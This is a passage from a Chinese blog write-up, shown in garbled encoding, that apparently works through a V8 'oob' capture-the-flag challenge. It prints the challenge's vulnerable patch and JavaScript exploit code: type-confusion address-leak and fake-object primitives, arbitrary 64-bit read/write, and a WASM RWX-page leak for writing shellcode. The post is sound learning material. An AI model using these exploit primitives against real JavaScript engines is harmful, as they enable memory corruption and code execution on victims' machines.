args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#ä»¥ä¸‹ä¸¤éƒ¨åˆ†åªæ˜¯ä¸ºäº†èƒ½æ­£å¸¸è¿è¡Œè¿™ä¸ªæ·»åŠ çš„å‡½æ•°è€Œå·²</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)        \</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br><span class="line"> </span><br></pre></td></tr></table></div></figure>

<p>å³æ·»åŠ äº†ä¸ºæ•°ç»„å¯¹è±¡<code>ArrayOob</code>æ·»åŠ äº†ä¸€ä¸ªå‡½æ•°oob()ï¼Œå…¶åŠŸèƒ½ä¸º</p>
<ul>
<li>å½“å‚æ•°åªæœ‰ä¸€ä¸ª(é»˜è®¤ä¼ å…¥thisæŒ‡é’ˆ)ï¼Œè¿”å›æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ ä¹‹åçš„å…ƒç´ </li>
<li>å½“å‚æ•°æœ‰ä¸¤ä¸ª(é™¤äº†thisæŒ‡é’ˆä¹‹å¤–å†ä¼ å…¥ä¸€ä¸ªå‚æ•°)ï¼Œå°±ç”¨æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°è¦†ç›–æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ ä¹‹åçš„å…ƒç´ </li>
<li>å…¶ä»–æƒ…å†µä¸‹è¿”å›ä¸€ä¸ªundefined</li>
</ul>
<p>å³è¯¥å‡½æ•°å¯ä»¥å®ç°<strong>è¯»/å†™</strong>æ•°ç»„å¯¹è±¡MAPå±æ€§</p>

        <h2 id="2-æ¼æ´åˆ†æ"   >
          <a href="#2-æ¼æ´åˆ†æ" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ¼æ´åˆ†æ" class="headerlink" title="2.æ¼æ´åˆ†æ"></a>2.æ¼æ´åˆ†æ</h2>
      <p>å…³é”®åœ¨äºæ•°ç»„å¯¹è±¡<code>ArrayOob</code>çš„å†…å­˜ç©ºé—´ï¼Œå°è¯•çœ‹ä¸€ä¸‹</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> float_array = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line">%DebugPrint(float_array);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></div></figure>

<p>è°ƒè¯•è·‘èµ·æ¥ï¼ŒæŸ¥çœ‹elementså¤„çš„å†…å­˜</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203182013498.png" alt="image-20220318201300196"></p>
<p>å³åœ¨æ•°ç»„å¯¹è±¡çš„å…ƒç´ ä¹‹åä¸ºæ•°ç»„å¯¹è±¡çš„ç»“æ„ä½“ï¼Œä¹‹å‰ä¹Ÿæåˆ°è¿‡ã€‚è€Œå¯¹è±¡çš„mapå¦‚æœèƒ½è¢«ä¿®æ”¹ï¼Œå°±èƒ½å¼•èµ·v8çš„ç±»å‹æ··æ·†ï¼Œä¹‹å‰å·²ç»æåˆ°è¿‡ã€‚</p>
<p>é‚£ä¹ˆæˆ‘ä»¬åˆ©ç”¨ç±»å‹æ··æ·†ï¼Œæ¥æ„é€ è·å–ä»»æ„å¯¹è±¡çš„åœ°å€çš„å‡½æ•°<code>getAddress(obj)</code>ä»¥åŠä¿®æ”¹ä»»æ„åœ°å€ä¸ºå¯¹è±¡çš„å‡½æ•°<code>getFakeObj(addr)</code></p>

        <h3 id="1-æ„é€ è½¬åŒ–å‡½æ•°"   >
          <a href="#1-æ„é€ è½¬åŒ–å‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ„é€ è½¬åŒ–å‡½æ•°" class="headerlink" title="(1)æ„é€ è½¬åŒ–å‡½æ•°"></a>(1)æ„é€ è½¬åŒ–å‡½æ•°</h3>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> float_array = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];<span class="comment">//åˆ›å»ºä¸€ä¸ªæµ®ç‚¹æ•°æ•°ç»„</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;<span class="comment">//åˆ›å»ºä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line"><span class="keyword">let</span> obj_array = [obj];<span class="comment">//åˆ›å»ºä¸€ä¸ªå¯¹è±¡æ•°ç»„</span></span><br><span class="line"><span class="keyword">let</span> float_array_map = float_array.oob()</span><br><span class="line"><span class="keyword">let</span> obj_array_map = obj_array.oob()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAddress</span>(<span class="params">obj</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj;<span class="comment">//è®¾ç½®å¯¹è±¡æ•°ç»„</span></span><br><span class="line">    obj_array.oob(float_array_map);<span class="comment">//å°†åŸæœ¬æ˜¯å¯¹è±¡çš„mapè¦†ç›–ä¸ºæµ®ç‚¹æ•°æ•°ç»„çš„map,ä¹‹åè¯»å–å°±ä¼šä»¥æµ®ç‚¹æ•°ç»„å¯¹è±¡çš„å½¢å¼è¯»å–</span></span><br><span class="line">    <span class="comment">//ä»å¯¹è±¡æ•°ç»„ä¸­è¯»å‡ºå¯¹è±¡ï¼Œä½†æ˜¯æ­¤æ—¶æ•´ä¸ªå¯¹è±¡æ•°ç»„å·²ç»è¢«æ”¹æˆæµ®ç‚¹æ•°ç»„ï¼Œæ‰€ä»¥ä¼šä»¥æµ®ç‚¹æ•°æ•°ç»„å½¢å¼è¯»å–ï¼Œå¾—åˆ°è¯¥å¯¹è±¡çš„åœ°å€</span></span><br><span class="line">    <span class="comment">//æ­£å¸¸æƒ…å†µä»å¯¹è±¡æ•°ç»„ä¸­è¯»å–å¯¹è±¡ä¼šè¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œä¸æ˜¯è¯¥å¯¹è±¡çš„åœ°å€ï¼Œä½†æ˜¯è½¬æ¢æˆæµ®ç‚¹æ•°ç»„å°±ä¼šè¯»å–åˆ°æˆå‘˜çš„åœ°å€ï¼Œè¿™å°±æ˜¯ç±»å‹æ··æ·†</span></span><br><span class="line">    <span class="keyword">let</span> addr = mem.f2i(obj_array[<span class="number">0</span>])</span><br><span class="line">    obj_array.oob(obj_map);<span class="comment">//é‡æ–°è®¾ç½®å›æ¥</span></span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFakeObj</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = mem.i2f(addr);<span class="comment">//è®¾ç½®æµ®ç‚¹æ•°æ•°ç»„</span></span><br><span class="line">    float_array.oob(obj_array_map);<span class="comment">//è®¾ç½®mapå±æ€§å°†æµ®ç‚¹æ•°æ•°ç»„è½¬åŒ–ä¸ºå¯¹è±¡æ•°ç»„</span></span><br><span class="line">    <span class="keyword">let</span> fake_obj = float_array[<span class="number">0</span>];<span class="comment">//è·å–è½¬åŒ–ä¹‹åçš„å¯¹è±¡æ•°ç»„ï¼Œå°±èƒ½å¾—åˆ°è¯¥fake_objï¼Œå…¶åœ°å€ä¸ºaddrï¼Œå¯¹è±¡ç±»å‹ä¸ºå­—å…¸å¯¹è±¡</span></span><br><span class="line">    float_array.oob(float_map);<span class="comment">//é‡æ–°è®¾ç½®å›æ¥</span></span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>å®é™…æµ‹è¯•ä¸€ä¸‹</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj_addr = getAddress(obj);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*]obj_addr:&quot;</span>+hex(obj_addr));</span><br><span class="line">%DebugPrint(obj)</span><br><span class="line">%SystemBreak()</span><br></pre></td></tr></table></div></figure>

<p>å¯ä»¥çœ‹åˆ°æˆåŠŸè·å–åœ°å€</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203221213865.png" alt="image-20220322121328820"></p>
<p>ä½†æ˜¯è¿™ä¹ˆåˆ¤æ–­è½¬åŒ–å¯¹è±¡æˆåŠŸä¸å¤ªçŸ¥é“â€¦</p>

        <h3 id="2-åˆ©ç”¨è½¬åŒ–å‡½æ•°æ„é€ ä»»æ„è¯»å†™"   >
          <a href="#2-åˆ©ç”¨è½¬åŒ–å‡½æ•°æ„é€ ä»»æ„è¯»å†™" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-åˆ©ç”¨è½¬åŒ–å‡½æ•°æ„é€ ä»»æ„è¯»å†™" class="headerlink" title="(2)åˆ©ç”¨è½¬åŒ–å‡½æ•°æ„é€ ä»»æ„è¯»å†™"></a>(2)åˆ©ç”¨è½¬åŒ–å‡½æ•°æ„é€ ä»»æ„è¯»å†™</h3>
      <p>å¾—åˆ°äº†ä¸Šè¿°çš„è½¬åŒ–å‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å€ŸåŠ©è¿™ä¸¤ä¸ªè½¬åŒ–å‡½æ•°æ¥è·å–ä»»æ„åœ°å€è¯»å’Œä»»æ„åœ°å€å†™</p>

        <h4 id="åŸç†ï¼š"   >
          <a href="#åŸç†ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#åŸç†ï¼š" class="headerlink" title="åŸç†ï¼š"></a>åŸç†ï¼š</h4>
      <p>åˆ©ç”¨<code>getFakeObj</code>å°†ä¸€ä¸ªåœ°å€è½¬åŒ–ä¸ºä¸€ä¸ªæµ®ç‚¹æ•°ç»„å¯¹è±¡ï¼Œè€Œå¦‚æœè¯¥åœ°å€æŒ‡å‘çš„elementsæŒ‡é’ˆå¯æ§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½å¤Ÿä¿®æ”¹å…¶elementsæŒ‡é’ˆï¼Œä»è€ŒæŒ‡å‘ä»»æ„åœ°æ–¹ï¼Œå»è¿›è¡Œè¯»å†™æ“ä½œã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºä¾æ®elementsè¯»å†™çš„æ—¶å€™æ²¡æœ‰è¿›è¡Œæ£€æµ‹ï¼Œæ‰€ä»¥åªè¦æˆåŠŸä¿®æ”¹äº†elementsæŒ‡é’ˆï¼Œé‚£ä¹ˆæˆ‘ä»¬æˆ‘ä»¬å°±èƒ½ä»elementså®é™…å­˜æ”¾æ•°æ®çš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯*(elements+0x10)å¤„è¯»å†™æˆ‘ä»¬çš„æ•°æ®ï¼Œé€ æˆä»»æ„åœ°å€è¯»å†™ã€‚</p>
<p>å‡å®šç”³è¯·<code>fake_array[6]</code>ï¼Œå¦‚ä¸‹å›¾å¸ƒå±€</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203221519946.png" alt="æœªå‘½åæ–‡ä»¶ (2)"></p>
<p>å³å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œè®¾ç½®<code>fake_array_addr-0x40+0x10</code>çš„åœ°å€ä¸ºä¸€ä¸ª<code>fake_obj</code>ï¼Œé‚£ä¹ˆè¯¥<code>fake_obj</code>ç›¸å…³çš„å±æ€§å¦‚ä¸‹</p>
<ul>
<li><p><code>map</code>å³ä¸º<code>float_array_map</code>ï¼Œå¯ä»¥ç”±fake_array[0]è¿›è¡Œæ§åˆ¶ï¼Œç”±æ­¤å¯ä»¥è¿›è¡Œå…ƒç´ è¯»å†™</p>
</li>
<li><p><code>protototype</code>å³è®¾ç½®ä¸º0ï¼Œå¯ç”±<code>fake_array[1]</code>è¿›è¡Œæ§åˆ¶</p>
</li>
<li><p><code>elements</code>å³è®¾ç½®ä¸ºæˆ‘ä»¬éœ€è¦è¯»å†™çš„åœ°å€ï¼Œå¯ç”±<code>fake_array[2]</code>è¿›è¡Œæ§åˆ¶</p>
</li>
</ul>
<p>é‚£ä¹ˆå³å¯å®Œæˆæ•´ä¸ªè¯»å†™å¸ƒå±€ã€‚</p>

        <h4 id="ä»£ç ï¼š"   >
          <a href="#ä»£ç ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä»£ç ï¼š" class="headerlink" title="ä»£ç ï¼š"></a>ä»£ç ï¼š</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    mem.i2f(<span class="number">0n</span>),</span><br><span class="line">    mem.i2f(<span class="number">0x41414141n</span>),</span><br><span class="line">    mem.i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">let</span> fake_array_addr = getAddress(fake_array);</span><br><span class="line"><span class="keyword">let</span> fake_object_addr = fake_array_addr - <span class="number">0x40n</span> + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">let</span> fake_object = getFakeObj(fake_object_addr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = mem.i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = mem.f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: &quot;</span> +hex(addr) + <span class="string">&quot;: &quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = mem.i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = mem.i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : &quot;</span> +hex(addr) + <span class="string">&quot;: &quot;</span> + hex(data));    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="æµ‹è¯•æ•ˆæœï¼š"   >
          <a href="#æµ‹è¯•æ•ˆæœï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#æµ‹è¯•æ•ˆæœï¼š" class="headerlink" title="æµ‹è¯•æ•ˆæœï¼š"></a>æµ‹è¯•æ•ˆæœï¼š</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%DebugPrint(fake_array);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] fake_array_addr:&quot;</span> + hex(fake_array_addr));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] fake_object_addr:&quot;</span> + hex(fake_object_addr));</span><br><span class="line">read64(fake_array_addr-<span class="number">0x40n</span>+<span class="number">0x28n</span>-<span class="number">1n</span>);</span><br><span class="line">write64(fake_object_addr+<span class="number">0x18n</span>-<span class="number">1n</span>,<span class="number">0x01020304n</span>);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></div></figure>

<p>é‚£ä¹ˆæˆ‘ä»¬å³è¯»å†™fake_array[3]å¤„çš„å€¼ï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸè¯»å†™</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203221529435.png" alt="image-20220322152925354"></p>

        <h2 id="3-å®é™…åˆ©ç”¨"   >
          <a href="#3-å®é™…åˆ©ç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-å®é™…åˆ©ç”¨" class="headerlink" title="3.å®é™…åˆ©ç”¨"></a>3.å®é™…åˆ©ç”¨</h2>
      
        <h3 id="1-å¸¸è§„å †æ€è·¯"   >
          <a href="#1-å¸¸è§„å †æ€è·¯" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å¸¸è§„å †æ€è·¯" class="headerlink" title="(1)å¸¸è§„å †æ€è·¯"></a>(1)å¸¸è§„å †æ€è·¯</h3>
      <p>é€šè¿‡æ³„éœ²d8çš„ELFåœ°å€ï¼Œè®¡ç®—å…¶GOTè¡¨åœ°å€ï¼Œä»»æ„è¯»æ³„éœ²å‡ºlibcåœ°å€ï¼Œç„¶åè¦†ç›–<code>free_hook</code>ä¸º<code>system</code>å‡½æ•°ï¼Œä¹‹åé€šè¿‡<code>console.log(&#39;/bin/sh\x00&#39;)</code>å³å¯é‡Šæ”¾ä¸€ä¸ªåŒ…å«<code>/bin/sh</code>çš„å †å—å®Œæˆåˆ©ç”¨</p>
<p>è¿™ä¸ªæ³„éœ²åœ°å€éƒ¨åˆ†æœ‰ç‚¹ä¸å¤ªå¥½æï¼Œéšæœºæ³„éœ²çš„éƒ¨åˆ†æ²¡çœ‹ï¼Œç¨³å®šæ³„éœ²çš„éƒ¨åˆ†ä¸å¤ªå¯¹ï¼Œè·å–åˆ°çš„ä¸æ˜¯d8ä¸­çš„æŒ‡ä»¤åœ°å€ï¼Œè€Œæ˜¯ä¸€ä¸ªlibåº“çš„æŒ‡ä»¤åœ°å€ã€‚</p>
<p>ğŸ”ºåé¢è¡¥æŠŠ</p>

        <h3 id="2-åˆ©ç”¨WASMæœºåˆ¶"   >
          <a href="#2-åˆ©ç”¨WASMæœºåˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-åˆ©ç”¨WASMæœºåˆ¶" class="headerlink" title="(2)åˆ©ç”¨WASMæœºåˆ¶"></a>(2)åˆ©ç”¨WASMæœºåˆ¶</h3>
      <p>å¦‚ä¸‹å¯ä»¥å°†Cè¯­è¨€ç›´æ¥è½¬æ¢ä¸ºwasmå¹¶ç”ŸæˆJSé…å¥—è°ƒç”¨ä»£ç </p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wasdk.github.io/WasmFiddle/" >WasmFiddle (wasdk.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>wasmå°±æ˜¯ä¸€ä¸ªç”¨æ¥è°ƒç”¨Cä»£ç çš„æœºåˆ¶ï¼Œå¯ä»¥è‡ªå·±å»çœ‹çœ‹ï¼Œä½†æ˜¯ä¸èƒ½èµ‹äºˆå±é™©çš„ä»£ç æ¥è°ƒç”¨ï¼Œåªèƒ½è¿è¡Œæ•°å­¦è®¡ç®—ã€å›¾åƒå¤„ç†ç­‰ç³»ç»Ÿæ— å…³çš„é«˜çº§è¯­è¨€ä»£ç ã€‚</p>
<p>ç®€å•æ¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ç‰‡WASMçš„ç©ºé—´ï¼Œç„¶åå¦‚æœæˆ‘ä»¬å¯ä»¥ä¿®æ”¹åˆ°è¿™ç‰‡è¿è¡ŒWASMä»£ç çš„å†…å­˜ç©ºé—´(åˆ©ç”¨ä¸Šè¿°çš„ä»»æ„å†™)ï¼Œä¿®æ”¹å…¶ä¸ºshellcodeï¼Œç„¶åå½“d8è°ƒç”¨WASMçš„æ¥å£æ—¶ï¼Œå°±å¯ä»¥è°ƒç”¨åˆ°æˆ‘ä»¬çš„shellcodeäº†ã€‚</p>
<p>è€Œè¿è¡ŒWASMä»£ç çš„å†…å­˜ç©ºé—´å³ä¸ºWASM_instance+0x88å¤„</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">let</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br></pre></td></tr></table></div></figure>

<p>ä¹Ÿå°±æ˜¯ä¸Šè¿°çš„<code>wasmInstance</code>åœ°å€+0x88å¤„</p>
<p>å…¶ä¸­wasmCodeçš„åŠŸèƒ½ä¸º</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> <span class="number">42</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘ æ³„éœ²åœ°å€"   >
          <a href="#â‘ æ³„éœ²åœ°å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ æ³„éœ²åœ°å€" class="headerlink" title="â‘ æ³„éœ²åœ°å€"></a>â‘ æ³„éœ²åœ°å€</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_instance_addr = getAddress(wasmInstance);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] wasm_instance_addr: &quot;</span> + hex(wasm_instance_addr));</span><br><span class="line"><span class="keyword">let</span> rwx_page_addr = read64(wasm_instance_addr -<span class="number">1n</span> + <span class="number">0x88n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] rwx_page_addr: &quot;</span> + hex(rwx_page_addr));</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¡å†™å…¥shellcodeåˆ°wasmçš„rwxæ®µ"   >
          <a href="#â‘¡å†™å…¥shellcodeåˆ°wasmçš„rwxæ®µ" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡å†™å…¥shellcodeåˆ°wasmçš„rwxæ®µ" class="headerlink" title="â‘¡å†™å…¥shellcodeåˆ°wasmçš„rwxæ®µ"></a>â‘¡å†™å…¥shellcodeåˆ°wasmçš„rwxæ®µ</h4>
      <p>è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼Œå°±æ˜¯è¿ç»­ä½¿ç”¨ä¸¤æ¬¡<code>write64</code>ä¼šå‡ºé”™ï¼Œå…·ä½“åŸå› ä¸æ¸…æ¥šï¼Œè¯´ä»€ä¹ˆfloatArrayå·²ç»è¢«ç¯¡æ”¹ï¼Œå†æ£€æµ‹åˆæ³•æ€§ä¼šå‡ºé”™ï¼Œè¢«ç¯¡æ”¹æˆå•¥ä¹Ÿä¸çŸ¥é“å•Šï¼Œè¿™è¾¹æœ‰ç‚¹é—®é¢˜ï¼Œä¹‹åçœ‹èƒ½ä¸èƒ½è¡¥ä¸Šã€‚</p>
<p>ğŸ”º</p>
<p>é‚£ä¹ˆä¾æ®å¤§ä½¬çš„ï¼Œéœ€è¦è¿›è¡Œä¿®æ”¹ï¼Œä½¿ç”¨<code>dataview</code>æ¥è¿›è¡Œä¿®æ”¹</p>
<p>åŸç†å³ä¸º</p>
<p>DataViewå¯¹è±¡ä¸­çš„<code>backing_store</code>ä¼šæŒ‡å‘ç”³è¯·çš„<code>data_buf</code>ï¼ˆ<code>backing_store</code>ç›¸å½“äºæˆ‘ä»¬çš„elementsï¼‰ï¼Œä¿®æ”¹<code>backing_store</code>ä¸ºæˆ‘ä»¬æƒ³è¦å†™çš„åœ°å€ï¼Œå¹¶é€šè¿‡DataViewå¯¹è±¡çš„setBigUint64æ–¹æ³•å°±å¯ä»¥å¾€æŒ‡å®šåœ°å€æ­£å¸¸å†™å…¥æ•°æ®äº†ã€‚</p>
<p>ğŸ”º</p>
<p>ä¸å¤ªæ‡‚</p>
